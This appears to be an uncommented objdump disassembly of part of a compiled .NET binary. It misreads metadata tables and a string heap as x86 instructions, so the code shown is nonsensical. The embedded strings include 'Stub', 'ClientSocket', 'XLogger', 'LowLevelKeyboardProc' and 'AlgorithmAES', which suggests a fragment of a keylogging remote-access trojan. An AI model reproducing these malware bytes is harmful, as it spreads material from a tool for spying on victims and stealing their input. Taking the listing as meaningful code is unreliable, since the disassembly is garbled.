  406a5c:	71 00                	jno    0x406a5e
  406a5e:	36 01 cf             	ss add %ecx,%edi
  406a61:	08 81 04 8d 1a d9    	or     %al,-0x26e572fc(%ecx)
  406a67:	08 61 00             	or     %ah,0x0(%ecx)
  406a6a:	36 01 48 04          	add    %ecx,%ss:0x4(%eax)
  406a6e:	19 01                	sbb    %eax,(%ecx)
  406a70:	9b                   	fwait
  406a71:	1a e0                	sbb    %al,%ah
  406a73:	08 61 00             	or     %ah,0x0(%ecx)
  406a76:	ed                   	in     (%dx),%eax
  406a77:	10 e5                	adc    %ah,%ch
  406a79:	08 21                	or     %ah,(%ecx)
  406a7b:	04 a5                	add    $0xa5,%al
  406a7d:	1a f3                	sbb    %bl,%dh
  406a7f:	08 49 01             	or     %cl,0x1(%ecx)
  406a82:	ac                   	lods   %ds:(%esi),%al
  406a83:	1a dc                	sbb    %ah,%bl
  406a85:	01 71 00             	add    %esi,0x0(%ecx)
  406a88:	2c 16                	sub    $0x16,%al
  406a8a:	ff 08                	decl   (%eax)
  406a8c:	e9 03 ba 1a 17       	jmp    0x175b2494
  406a91:	09 49 01             	or     %ecx,0x1(%ecx)
  406a94:	c4 1a                	les    (%edx),%ebx
  406a96:	dc 01                	faddl  (%ecx)
  406a98:	49                   	dec    %ecx
  406a99:	01 d7                	add    %edx,%edi
  406a9b:	1a ca                	sbb    %dl,%cl
  406a9d:	00 f9                	add    %bh,%cl
  406a9f:	01 eb                	add    %ebp,%ebx
  406aa1:	1a 9f 00 91 04 36    	sbb    0x36049100(%edi),%bl
  406aa7:	01 a3 02 91 04 01    	add    %esp,0x1049102(%ebx)
  406aad:	1b 73 05             	sbb    0x5(%ebx),%esi
  406ab0:	e9 03 15 1b e6       	jmp    0xe65b7fb8
  406ab5:	07                   	pop    %es
  406ab6:	b1 01                	mov    $0x1,%cl
  406ab8:	4d                   	dec    %ebp
  406ab9:	02 1f                	add    (%edi),%bl
  406abb:	04 19                	add    $0x19,%al
  406abd:	01 1f                	add    %ebx,(%edi)
  406abf:	1b 71 00             	sbb    0x0(%ecx),%esi
  406ac2:	a1 04 30 1b 32       	mov    0x321b3004,%eax
  406ac7:	09 21                	or     %esp,(%ecx)
  406ac9:	03 57 1b             	add    0x1b(%edi),%edx
  406acc:	37                   	aaa
  406acd:	09 21                	or     %esp,(%ecx)
  406acf:	03 02                	add    (%edx),%eax
  406ad1:	09 41 09             	or     %eax,0x9(%ecx)
  406ad4:	21 03                	and    %eax,(%ebx)
  406ad6:	57                   	push   %edi
  406ad7:	1b 54 09 21          	sbb    0x21(%ecx,%ecx,1),%edx
  406adb:	03 11                	add    (%ecx),%edx
  406add:	09 ed                	or     %ebp,%ebp
  406adf:	04 39                	add    $0x39,%al
  406ae1:	00 36                	add    %dh,(%esi)
  406ae3:	01 99 08 39 01 76    	add    %ebx,0x76013908(%ecx)
  406ae9:	1b 67 09             	sbb    0x9(%edi),%esp
  406aec:	b9 04 af 15 6e       	mov    $0x6e15af04,%ecx
  406af1:	09 c1                	or     %eax,%ecx
  406af3:	04 36                	add    $0x36,%al
  406af5:	01 75 09             	add    %esi,0x9(%ebp)
  406af8:	01 02                	add    %eax,(%edx)
  406afa:	bf 1b 17 05 b9       	mov    $0xb905171b,%edi
  406aff:	04 d7                	add    $0xd7,%al
  406b01:	17                   	pop    %ss
  406b02:	90                   	nop
  406b03:	09 69 04             	or     %ebp,0x4(%ecx)
  406b06:	ce                   	into
  406b07:	1b a6 08 79 00 36    	sbb    0x36007908(%esi),%esp
  406b0d:	01 b7 09 81 01 5e    	add    %esi,0x5e018109(%edi)
  406b13:	12 13                	adc    (%ebx),%dl
  406b15:	00 d1                	add    %dl,%cl
  406b17:	04 36                	add    $0x36,%al
  406b19:	01 c4                	add    %eax,%esp
  406b1b:	09 e1                	or     %esp,%ecx
  406b1d:	04 36                	add    $0x36,%al
  406b1f:	01 48 04             	add    %ecx,0x4(%eax)
  406b22:	e9 04 36 01 13       	jmp    0x1341a12b
  406b27:	00 f1                	add    %dh,%cl
  406b29:	04 36                	add    $0x36,%al
  406b2b:	01 a3 02 f9 04 36    	add    %esp,0x3604f902(%ebx)
  406b31:	01 a3 02 01 05 36    	add    %esp,0x36050102(%ebx)
  406b37:	01 a3 02 09 05 36    	add    %esp,0x36050902(%ebx)
  406b3d:	01 a3 02 11 05 36    	add    %esp,0x36051102(%ebx)
  406b43:	01 a3 02 19 05 36    	add    %esp,0x36051902(%ebx)
  406b49:	01 a3 02 21 05 36    	add    %esp,0x36052102(%ebx)
  406b4f:	01 a3 02 29 05 36    	add    %esp,0x36052902(%ebx)
  406b55:	01 a3 02 08 00 84    	add    %esp,-0x7bfff7fe(%ebx)
  406b5b:	00 37                	add    %dh,(%edi)
  406b5d:	01 0e                	add    %ecx,(%esi)
  406b5f:	00 98 00 93 01 09    	add    %bl,0x9019300(%eax)
  406b65:	00 d0                	add    %dl,%al
  406b67:	00 36                	add    %dh,(%esi)
  406b69:	02 09                	add    (%ecx),%cl
  406b6b:	00 d4                	add    %dl,%ah
  406b6d:	00 3b                	add    %bh,(%ebx)
  406b6f:	02 09                	add    (%ecx),%cl
  406b71:	00 d8                	add    %bl,%al
  406b73:	00 40 02             	add    %al,0x2(%eax)
  406b76:	29 00                	sub    %eax,(%eax)
  406b78:	83 00 dd             	addl   $0xffffffdd,(%eax)
  406b7b:	02 2e                	add    (%esi),%ch
  406b7d:	00 23                	add    %ah,(%ebx)
  406b7f:	09 9b 03 2e 00 1b    	or     %ebx,0x1b002e03(%ebx)
  406b85:	09 9b 03 2e 00 eb    	or     %ebx,-0x14ffd1fd(%ebx)
  406b8b:	08 cd                	or     %cl,%ch
  406b8d:	09 2e                	or     %ebp,(%esi)
  406b8f:	00 f3                	add    %dh,%bl
  406b91:	08 d6                	or     %dl,%dh
  406b93:	09 2e                	or     %ebp,(%esi)
  406b95:	00 13                	add    %dl,(%ebx)
  406b97:	09 9b 03 2e 00 33    	or     %ebx,0x33002e03(%ebx)
  406b9d:	09 9b 03 2e 00 2b    	or     %ebx,0x2b002e03(%ebx)
  406ba3:	09 9b 03 2e 00 fb    	or     %ebx,-0x4ffd1fd(%ebx)
  406ba9:	08 f5                	or     %dh,%ch
  406bab:	09 2e                	or     %ebp,(%esi)
  406bad:	00 03                	add    %al,(%ebx)
  406baf:	09 1f                	or     %ebx,(%edi)
  406bb1:	0a 2e                	or     (%esi),%ch
  406bb3:	00 0b                	add    %cl,(%ebx)
  406bb5:	09 9b 03 40 00 2b    	or     %ebx,0x2b004003(%ebx)
  406bbb:	00 40 02             	add    %al,0x2(%eax)
  406bbe:	40                   	inc    %eax
  406bbf:	00 13                	add    %dl,(%ebx)
  406bc1:	00 4b 02             	add    %cl,0x2(%ebx)
  406bc4:	43                   	inc    %ebx
  406bc5:	00 1b                	add    %bl,(%ebx)
  406bc7:	00 5a 02             	add    %bl,0x2(%edx)
  406bca:	43                   	inc    %ebx
  406bcb:	00 13                	add    %dl,(%ebx)
  406bcd:	00 4b 02             	add    %cl,0x2(%ebx)
  406bd0:	49                   	dec    %ecx
  406bd1:	00 83 00 b5 02 63    	add    %al,0x6302b500(%ebx)
  406bd7:	00 13                	add    %dl,(%ebx)
  406bd9:	00 4b 02             	add    %cl,0x2(%ebx)
  406bdc:	63 00                	arpl   %eax,(%eax)
  406bde:	1b 00                	sbb    (%eax),%eax
  406be0:	5a                   	pop    %edx
  406be1:	02 69 00             	add    0x0(%ecx),%ch
  406be4:	83 00 a8             	addl   $0xffffffa8,(%eax)
  406be7:	02 80 00 2b 00 40    	add    0x40002b00(%eax),%al
  406bed:	02 83 00 1b 00 5a    	add    0x5a001b00(%ebx),%al
  406bf3:	02 83 00 73 00 40    	add    0x40007300(%ebx),%al
  406bf9:	02 83 00 7b 00 40    	add    0x40007b00(%ebx),%al
  406bff:	02 89 00 83 00 c9    	add    -0x36ff7d00(%ecx),%cl
  406c05:	02 a0 00 2b 00 40    	add    0x40002b00(%eax),%ah
  406c0b:	02 a1 00 db 00 40    	add    0x4000db00(%ecx),%ah
  406c11:	02 a1 00 e3 00 40    	add    0x4000e300(%ecx),%ah
  406c17:	02 a3 00 13 00 4b    	add    0x4b001300(%ebx),%ah
  406c1d:	02 a3 00 c3 00 23    	add    0x2300c300(%ebx),%ah
  406c23:	03 c0                	add    %eax,%eax
  406c25:	00 2b                	add    %ch,(%ebx)
  406c27:	00 40 02             	add    %al,0x2(%eax)
  406c2a:	c3                   	ret
  406c2b:	00 13                	add    %dl,(%ebx)
  406c2d:	00 4b 02             	add    %cl,0x2(%ebx)
  406c30:	c3                   	ret
  406c31:	00 d3                	add    %dl,%bl
  406c33:	00 9b 03 e0 00 2b    	add    %bl,0x2b00e003(%ebx)
  406c39:	00 40 02             	add    %al,0x2(%eax)
  406c3c:	00 01                	add    %al,(%ecx)
  406c3e:	13 00                	adc    (%eax),%eax
  406c40:	4b                   	dec    %ebx
  406c41:	02 00                	add    (%eax),%al
  406c43:	01 2b                	add    %ebp,(%ebx)
  406c45:	00 40 02             	add    %al,0x2(%eax)
  406c48:	20 01                	and    %al,(%ecx)
  406c4a:	2b 00                	sub    (%eax),%eax
  406c4c:	40                   	inc    %eax
  406c4d:	02 20                	add    (%eax),%ah
  406c4f:	01 13                	add    %edx,(%ebx)
  406c51:	00 4b 02             	add    %cl,0x2(%ebx)
  406c54:	40                   	inc    %eax
  406c55:	01 2b                	add    %ebp,(%ebx)
  406c57:	00 40 02             	add    %al,0x2(%eax)
  406c5a:	40                   	inc    %eax
  406c5b:	01 13                	add    %edx,(%ebx)
  406c5d:	00 4b 02             	add    %cl,0x2(%ebx)
  406c60:	60                   	pusha
  406c61:	01 2b                	add    %ebp,(%ebx)
  406c63:	00 40 02             	add    %al,0x2(%eax)
  406c66:	60                   	pusha
  406c67:	01 13                	add    %edx,(%ebx)
  406c69:	00 4b 02             	add    %cl,0x2(%ebx)
  406c6c:	80 01 2b             	addb   $0x2b,(%ecx)
  406c6f:	00 40 02             	add    %al,0x2(%eax)
  406c72:	a0 01 2b 00 40       	mov    0x40002b01,%al
  406c77:	02 c0                	add    %al,%al
  406c79:	01 13                	add    %edx,(%ebx)
  406c7b:	00 4b 02             	add    %cl,0x2(%ebx)
  406c7e:	c0 01 2b             	rolb   $0x2b,(%ecx)
  406c81:	00 40 02             	add    %al,0x2(%eax)
  406c84:	c3                   	ret
  406c85:	01 73 00             	add    %esi,0x0(%ebx)
  406c88:	40                   	inc    %eax
  406c89:	02 e0                	add    %al,%ah
  406c8b:	01 2b                	add    %ebp,(%ebx)
  406c8d:	00 40 02             	add    %al,0x2(%eax)
  406c90:	00 02                	add    %al,(%edx)
  406c92:	2b 00                	sub    (%eax),%eax
  406c94:	40                   	inc    %eax
  406c95:	02 00                	add    (%eax),%al
  406c97:	02 13                	add    (%ebx),%dl
  406c99:	00 4b 02             	add    %cl,0x2(%ebx)
  406c9c:	43                   	inc    %ebx
  406c9d:	02 e3                	add    %bl,%ah
  406c9f:	00 40 02             	add    %al,0x2(%eax)
  406ca2:	43                   	inc    %ebx
  406ca3:	02 fb                	add    %bl,%bh
  406ca5:	00 b5 03 63 02 e3    	add    %dh,-0x1cfd9cfd(%ebp)
  406cab:	00 40 02             	add    %al,0x2(%eax)
  406cae:	80 02 a3             	addb   $0xa3,(%edx)
  406cb1:	01 40 02             	add    %eax,0x2(%eax)
  406cb4:	c0 02 e3             	rolb   $0xe3,(%edx)
  406cb7:	00 40 02             	add    %al,0x2(%eax)
  406cba:	e0 02                	loopne 0x406cbe
  406cbc:	e3 00                	jecxz  0x406cbe
  406cbe:	40                   	inc    %eax
  406cbf:	02 e0                	add    %al,%ah
  406cc1:	02 03                	add    (%ebx),%al
  406cc3:	01 40 02             	add    %eax,0x2(%eax)
  406cc6:	00 03                	add    %al,(%ebx)
  406cc8:	e3 00                	jecxz  0x406cca
  406cca:	40                   	inc    %eax
  406ccb:	02 80 05 03 01 40    	add    0x40010305(%eax),%al
  406cd1:	02 80 05 e3 00 40    	add    0x4000e305(%eax),%al
  406cd7:	02 a0 05 e3 00 40    	add    0x4000e305(%eax),%ah
  406cdd:	02 a0 05 03 01 40    	add    0x40010305(%eax),%ah
  406ce3:	02 60 07             	add    0x7(%eax),%ah
  406ce6:	e3 00                	jecxz  0x406ce8
  406ce8:	40                   	inc    %eax
  406ce9:	02 60 07             	add    0x7(%eax),%ah
  406cec:	03 01                	add    (%ecx),%eax
  406cee:	40                   	inc    %eax
  406cef:	02 80 07 03 01 40    	add    0x40010307(%eax),%al
  406cf5:	02 80 07 e3 00 40    	add    0x4000e307(%eax),%al
  406cfb:	02 80 0e e3 00 40    	add    0x4000e30e(%eax),%al
  406d01:	02 3d 00 11 08 41    	add    0x41081100,%bh
  406d07:	00 11                	add    %dl,(%ecx)
  406d09:	08 62 00             	or     %ah,0x0(%edx)
  406d0c:	cb                   	lret
  406d0d:	09 64 00 cb          	or     %esp,-0x35(%eax,%eax,1)
  406d11:	09 83 00 83 08 8f    	or     %eax,-0x70f77d00(%ebx)
  406d17:	02 94 02 99 02 9e 02 	add    0x29e0299(%edx,%eax,1),%dl
  406d1e:	f3 02 f7             	repz add %bh,%dh
  406d21:	02 02                	add    (%edx),%al
  406d23:	03 07                	add    (%edi),%eax
  406d25:	03 16                	add    (%esi),%edx
  406d27:	03 16                	add    (%esi),%edx
  406d29:	03 91 03 06 04 24    	add    0x24040603(%ecx),%edx
  406d2f:	04 71                	add    $0x71,%al
  406d31:	04 8d                	add    $0x8d,%al
  406d33:	04 9d                	add    $0x9d,%al
  406d35:	04 b1                	add    $0xb1,%al
  406d37:	04 cc                	add    $0xcc,%al
  406d39:	04 fe                	add    $0xfe,%al
  406d3b:	04 1d                	add    $0x1d,%al
  406d3d:	05 2e 05 4c 05       	add    $0x54c052e,%eax
  406d42:	90                   	nop
  406d43:	05 9a 05 af 05       	add    $0x5af059a,%eax
  406d48:	9a 05 bd 05 d2 05 78 	lcall  $0x7805,$0xd205bd05
  406d4f:	06                   	push   %es
  406d50:	f4                   	hlt
  406d51:	06                   	push   %es
  406d52:	9a 05 9a 05 1e 07 67 	lcall  $0x6707,$0x1e059a05
  406d59:	07                   	pop    %es
  406d5a:	8f 07                	pop    (%edi)
  406d5c:	98                   	cwtl
  406d5d:	07                   	pop    %es
  406d5e:	b2 07                	mov    $0x7,%dl
  406d60:	d6                   	salc
  406d61:	07                   	pop    %es
  406d62:	fd                   	std
  406d63:	07                   	pop    %es
  406d64:	13 08                	adc    (%eax),%ecx
  406d66:	29 08                	sub    %ecx,(%eax)
  406d68:	5b                   	pop    %ebx
  406d69:	08 67 08             	or     %ah,0x8(%edi)
  406d6c:	78 08                	js     0x406d76
  406d6e:	b5 08                	mov    $0x8,%ch
  406d70:	d4 08                	aam    $0x8
  406d72:	f3 02 eb             	repz add %bl,%ch
  406d75:	08 f7                	or     %dh,%bh
  406d77:	02 06                	add    (%esi),%al
  406d79:	09 9c 00 0b 09 12 09 	or     %ebx,0x912090b(%eax,%eax,1)
  406d80:	07                   	pop    %es
  406d81:	03 1d 09 23 09 4a    	add    0x4a092309,%ebx
  406d87:	09 5b 09             	or     %ebx,0x9(%ebx)
  406d8a:	7f 09                	jg     0x406d95
  406d8c:	96                   	xchg   %eax,%esi
  406d8d:	09 a4 09 a4 09 bf 09 	or     %esp,0x9bf09a4(%ecx,%ecx,1)
  406d94:	04 00                	add    $0x0,%al
  406d96:	01 00                	add    %eax,(%eax)
  406d98:	06                   	push   %es
  406d99:	00 05 00 00 00 5a    	add    %al,0x5a000000
  406d9f:	01 4f 00             	add    %ecx,0x0(%edi)
  406da2:	00 00                	add    %al,(%eax)
  406da4:	13 02                	adc    (%edx),%eax
  406da6:	54                   	push   %esp
  406da7:	00 00                	add    %al,(%eax)
  406da9:	00 c2                	add    %al,%dl
  406dab:	01 59 00             	add    %ebx,0x0(%ecx)
  406dae:	00 00                	add    %al,(%eax)
  406db0:	1f                   	pop    %ds
  406db1:	02 5e 00             	add    0x0(%esi),%bl
  406db4:	00 00                	add    %al,(%eax)
  406db6:	ac                   	lods   %ds:(%esi),%al
  406db7:	02 94 00 02 00 04 00 	add    0x40002(%eax,%eax,1),%dl
  406dbe:	03 00                	add    (%eax),%eax
  406dc0:	02 00                	add    (%eax),%al
  406dc2:	05 00 05 00 02       	add    $0x2000500,%eax
  406dc7:	00 06                	add    %al,(%esi)
  406dc9:	00 07                	add    %al,(%edi)
  406dcb:	00 02                	add    %al,(%edx)
  406dcd:	00 07                	add    %al,(%edi)
  406dcf:	00 09                	add    %cl,(%ecx)
  406dd1:	00 02                	add    %al,(%edx)
  406dd3:	00 0f                	add    %cl,(%edi)
  406dd5:	00 0b                	add    %cl,(%ebx)
  406dd7:	00 f3                	add    %dh,%bl
  406dd9:	17                   	pop    %ss
  406dda:	5b                   	pop    %ebx
  406ddb:	19 66 19             	sbb    %esp,0x19(%esi)
  406dde:	de 1b                	ficomps (%ebx)
  406de0:	75 00                	jne    0x406de2
  406de2:	75 00                	jne    0x406de4
  406de4:	88 00                	mov    %al,(%eax)
  406de6:	73 02                	jae    0x406dea
  406de8:	7a 02                	jp     0x406dec
  406dea:	81 02 88 02 85 03    	addl   $0x3850288,(%edx)
  406df0:	da 05 33 07 47 07    	fiaddl 0x7470733
  406df6:	00 01                	add    %al,(%ecx)
  406df8:	6d                   	insl   (%dx),%es:(%edi)
  406df9:	00 c4                	add    %al,%ah
  406dfb:	04 01                	add    $0x1,%al
  406dfd:	00 43 01             	add    %al,0x1(%ebx)
  406e00:	6f                   	outsl  %ds:(%esi),(%dx)
  406e01:	00 1c 05 01 00 46 01 	add    %bl,0x1460001(,%eax,1)
  406e08:	8d 00                	lea    (%eax),%eax
  406e0a:	21 06                	and    %eax,(%esi)
  406e0c:	02 00                	add    (%eax),%al
  406e0e:	46                   	inc    %esi
  406e0f:	01 8f 00 4e 06 02    	add    %ecx,0x2064e00(%edi)
  406e15:	00 46 01             	add    %al,0x1(%esi)
  406e18:	91                   	xchg   %eax,%ecx
  406e19:	00 66 06             	add    %ah,0x6(%esi)
  406e1c:	02 00                	add    (%eax),%al
  406e1e:	46                   	inc    %esi
  406e1f:	01 93 00 75 06 03    	add    %edx,0x3067500(%ebx)
  406e25:	00 00                	add    %al,(%eax)
  406e27:	01 95 00 9f 06 02    	add    %edx,0x2069f00(%ebp)
  406e2d:	00 40 01             	add    %al,0x1(%eax)
  406e30:	97                   	xchg   %eax,%edi
  406e31:	00 b3 06 02 00 07    	add    %dh,0x7000206(%ebx)
  406e37:	01 99 00 df 06 02    	add    %ebx,0x206df00(%ecx)
  406e3d:	00 40 01             	add    %al,0x1(%eax)
  406e40:	9b                   	fwait
  406e41:	00 f3                	add    %dh,%bl
  406e43:	06                   	push   %es
  406e44:	02 00                	add    (%eax),%al
  406e46:	00 01                	add    %al,(%ecx)
  406e48:	9d                   	popf
  406e49:	00 0f                	add    %cl,(%edi)
  406e4b:	07                   	pop    %es
  406e4c:	02 00                	add    (%eax),%al
  406e4e:	00 01                	add    %al,(%ecx)
  406e50:	9f                   	lahf
  406e51:	00 44 07 02          	add    %al,0x2(%edi,%eax,1)
  406e55:	00 00                	add    %al,(%eax)
  406e57:	01 a1 00 81 07 02    	add    %esp,0x2078100(%ecx)
  406e5d:	00 40 01             	add    %al,0x1(%eax)
  406e60:	a9 00 b7 07 04       	test   $0x407b700,%eax
  406e65:	00 00                	add    %al,(%eax)
  406e67:	01 af 00 21 08 02    	add    %ebp,0x2082100(%edi)
  406e6d:	00 00                	add    %al,(%eax)
  406e6f:	01 b5 00 9f 06 02    	add    %esi,0x2069f00(%ebp)
  406e75:	00 00                	add    %al,(%eax)
  406e77:	01 b7 00 9e 08 02    	add    %esi,0x2089e00(%edi)
  406e7d:	00 40 01             	add    %al,0x1(%eax)
  406e80:	b9 00 b7 08 03       	mov    $0x308b700,%ecx
  406e85:	00 04 80             	add    %al,(%eax,%eax,4)
  406e88:	00 00                	add    %al,(%eax)
  406e8a:	01 00                	add    %eax,(%eax)
	...
  406e98:	0f 1d 00             	nopl   (%eax)
  406e9b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406ea6:	00 00                	add    %al,(%eax)
  406ea8:	01 00                	add    %eax,(%eax)
  406eaa:	0a 00                	or     (%eax),%al
  406eac:	00 00                	add    %al,(%eax)
  406eae:	00 00                	add    %al,(%eax)
  406eb0:	0a 00                	or     (%eax),%al
	...
  406eba:	00 00                	add    %al,(%eax)
  406ebc:	0a 00                	or     (%eax),%al
  406ebe:	13 00                	adc    (%eax),%eax
  406ec0:	00 00                	add    %al,(%eax)
  406ec2:	00 00                	add    %al,(%eax)
  406ec4:	04 00                	add    $0x0,%al
	...
  406ece:	00 00                	add    %al,(%eax)
  406ed0:	01 00                	add    %eax,(%eax)
  406ed2:	63 01                	arpl   %eax,(%ecx)
  406ed4:	00 00                	add    %al,(%eax)
  406ed6:	00 00                	add    %al,(%eax)
  406ed8:	04 00                	add    $0x0,%al
	...
  406ee2:	00 00                	add    %al,(%eax)
  406ee4:	0a 00                	or     (%eax),%al
  406ee6:	40                   	inc    %eax
  406ee7:	10 00                	adc    %al,(%eax)
  406ee9:	00 00                	add    %al,(%eax)
  406eeb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406ef6:	00 00                	add    %al,(%eax)
  406ef8:	0a 00                	or     (%eax),%al
  406efa:	be 12 00 00 00       	mov    $0x12,%esi
  406eff:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  406f0a:	00 00                	add    %al,(%eax)
  406f0c:	01 00                	add    %eax,(%eax)
  406f0e:	02 13                	add    (%ebx),%dl
  406f10:	00 00                	add    %al,(%eax)
  406f12:	00 00                	add    %al,(%eax)
  406f14:	04 00                	add    $0x0,%al
	...
  406f1e:	00 00                	add    %al,(%eax)
  406f20:	01 00                	add    %eax,(%eax)
  406f22:	77 16                	ja     0x406f3a
  406f24:	00 00                	add    %al,(%eax)
  406f26:	00 00                	add    %al,(%eax)
  406f28:	05 00 04 00 06       	add    $0x6000400,%eax
  406f2d:	00 04 00             	add    %al,(%eax,%eax,1)
  406f30:	0f 00 0c 00          	str    (%eax,%eax,1)
  406f34:	10 00                	adc    %al,(%eax)
  406f36:	0e                   	push   %cs
  406f37:	00 11                	add    %dl,(%ecx)
  406f39:	00 0e                	add    %cl,(%esi)
  406f3b:	00 13                	add    %dl,(%ebx)
  406f3d:	00 0a                	add    %cl,(%edx)
  406f3f:	00 00                	add    %al,(%eax)
  406f41:	00 10                	add    %dl,(%eax)
  406f43:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406f46:	69 02 00 00 10 00    	imul   $0x100000,(%edx),%eax
  406f4c:	19 00                	sbb    %eax,(%eax)
  406f4e:	69 02 00 00 00 00    	imul   $0x0,(%edx),%eax
  406f54:	1b 00                	sbb    (%eax),%eax
  406f56:	69 02 2d 00 11 03    	imul   $0x311002d,(%edx),%eax
  406f5c:	2d 00 8c 03 7f       	sub    $0x7f038c00,%eax
  406f61:	01 63 07             	add    %esp,0x7(%ebx)
  406f64:	05 02 fa 08 00       	add    $0x8fa02,%eax
  406f69:	00 00                	add    %al,(%eax)
  406f6b:	00 00                	add    %al,(%eax)
  406f6d:	3c 4d                	cmp    $0x4d,%al
  406f6f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f70:	64 75 6c             	fs jne 0x406fdf
  406f73:	65 3e 00 6d 73       	gs add %ch,%ds:0x73(%ebp)
  406f78:	63 6f 72             	arpl   %ebp,0x72(%edi)
  406f7b:	6c                   	insb   (%dx),%es:(%edi)
  406f7c:	69 62 00 4d 69 63 72 	imul   $0x7263694d,0x0(%edx),%esp
  406f83:	6f                   	outsl  %ds:(%esi),(%dx)
  406f84:	73 6f                	jae    0x406ff5
  406f86:	66 74 2e             	data16 je 0x406fb7
  406f89:	56                   	push   %esi
  406f8a:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406f91:	73 69                	jae    0x406ffc
  406f93:	63 00                	arpl   %eax,(%eax)
  406f95:	4d                   	dec    %ebp
  406f96:	79 41                	jns    0x406fd9
  406f98:	70 70                	jo     0x40700a
  406f9a:	6c                   	insb   (%dx),%es:(%edi)
  406f9b:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  406fa2:	00 4d 79             	add    %cl,0x79(%ebp)
  406fa5:	00 4d 79             	add    %cl,0x79(%ebp)
  406fa8:	43                   	inc    %ebx
  406fa9:	6f                   	outsl  %ds:(%esi),(%dx)
  406faa:	6d                   	insl   (%dx),%es:(%edi)
  406fab:	70 75                	jo     0x407022
  406fad:	74 65                	je     0x407014
  406faf:	72 00                	jb     0x406fb1
  406fb1:	4d                   	dec    %ebp
  406fb2:	79 50                	jns    0x407004
  406fb4:	72 6f                	jb     0x407025
  406fb6:	6a 65                	push   $0x65
  406fb8:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  406fbc:	79 57                	jns    0x407015
  406fbe:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  406fc2:	72 76                	jb     0x40703a
  406fc4:	69 63 65 73 00 54 68 	imul   $0x68540073,0x65(%ebx),%esp
  406fcb:	72 65                	jb     0x407032
  406fcd:	61                   	popa
  406fce:	64 53                	fs push %ebx
  406fd0:	61                   	popa
  406fd1:	66 65 4f             	gs dec %di
  406fd4:	62 6a 65             	bound  %ebp,0x65(%edx)
  406fd7:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  406fdb:	6f                   	outsl  %ds:(%esi),(%dx)
  406fdc:	76 69                	jbe    0x407047
  406fde:	64 65 72 60          	fs gs jb 0x407042
  406fe2:	31 00                	xor    %eax,(%eax)
  406fe4:	53                   	push   %ebx
  406fe5:	65 74 74             	gs je  0x40705c
  406fe8:	69 6e 67 73 00 4d 61 	imul   $0x614d0073,0x67(%esi),%ebp
  406fef:	69 6e 00 53 74 75 62 	imul   $0x62757453,0x0(%esi),%ebp
  406ff6:	00 43 6c             	add    %al,0x6c(%ebx)
  406ff9:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  407000:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  407004:	4d                   	dec    %ebp
  407005:	65 73 73             	gs jae 0x40707b
  407008:	61                   	popa
  407009:	67 65 73 00          	addr16 gs jae 0x40700d
  40700d:	55                   	push   %ebp
  40700e:	6e                   	outsb  %ds:(%esi),(%dx)
  40700f:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  407016:	65 72 00             	gs jb  0x407019
  407019:	58                   	pop    %eax
  40701a:	4c                   	dec    %esp
  40701b:	6f                   	outsl  %ds:(%esi),(%dx)
  40701c:	67 67 65 72 00       	addr16 addr16 gs jb 0x407021
  407021:	41                   	inc    %ecx
  407022:	6c                   	insb   (%dx),%es:(%edi)
  407023:	67 6f                	outsl  %ds:(%si),(%dx)
  407025:	72 69                	jb     0x407090
  407027:	74 68                	je     0x407091
  407029:	6d                   	insl   (%dx),%es:(%edi)
  40702a:	41                   	inc    %ecx
  40702b:	45                   	inc    %ebp
  40702c:	53                   	push   %ebx
  40702d:	00 48 65             	add    %cl,0x65(%eax)
  407030:	6c                   	insb   (%dx),%es:(%edi)
  407031:	70 65                	jo     0x407098
  407033:	72 00                	jb     0x407035
  407035:	4c                   	dec    %esp
  407036:	6f                   	outsl  %ds:(%esi),(%dx)
  407037:	77 4c                	ja     0x407085
  407039:	65 76 65             	gs jbe 0x4070a1
  40703c:	6c                   	insb   (%dx),%es:(%edi)
  40703d:	4b                   	dec    %ebx
  40703e:	65 79 62             	gs jns 0x4070a3
  407041:	6f                   	outsl  %ds:(%esi),(%dx)
  407042:	61                   	popa
  407043:	72 64                	jb     0x4070a9
  407045:	50                   	push   %eax
  407046:	72 6f                	jb     0x4070b7
  407048:	63 00                	arpl   %eax,(%eax)
  40704a:	4c                   	dec    %esp
  40704b:	41                   	inc    %ecx
  40704c:	53                   	push   %ebx
  40704d:	54                   	push   %esp
  40704e:	49                   	dec    %ecx
  40704f:	4e                   	dec    %esi
  407050:	50                   	push   %eax
  407051:	55                   	push   %ebp
  407052:	54                   	push   %esp
  407053:	49                   	dec    %ecx
  407054:	4e                   	dec    %esi
  407055:	46                   	inc    %esi
  407056:	4f                   	dec    %edi
  407057:	00 45 58             	add    %al,0x58(%ebp)
  40705a:	45                   	inc    %ebp
  40705b:	43                   	inc    %ebx
  40705c:	55                   	push   %ebp
  40705d:	54                   	push   %esp
  40705e:	49                   	dec    %ecx
  40705f:	4f                   	dec    %edi
  407060:	4e                   	dec    %esi
  407061:	5f                   	pop    %edi
  407062:	53                   	push   %ebx
  407063:	54                   	push   %esp
  407064:	41                   	inc    %ecx
  407065:	54                   	push   %esp
  407066:	45                   	inc    %ebp
  407067:	00 4d 69             	add    %cl,0x69(%ebp)
  40706a:	63 72 6f             	arpl   %esi,0x6f(%edx)
  40706d:	73 6f                	jae    0x4070de
  40706f:	66 74 2e             	data16 je 0x4070a0
  407072:	56                   	push   %esi
  407073:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  40707a:	73 69                	jae    0x4070e5
  40707c:	63 2e                	arpl   %ebp,(%esi)
  40707e:	41                   	inc    %ecx
  40707f:	70 70                	jo     0x4070f1
  407081:	6c                   	insb   (%dx),%es:(%edi)
  407082:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407089:	53                   	push   %ebx
  40708a:	65 72 76             	gs jb  0x407103
  40708d:	69 63 65 73 00 41 70 	imul   $0x70410073,0x65(%ebx),%esp
  407094:	70 6c                	jo     0x407102
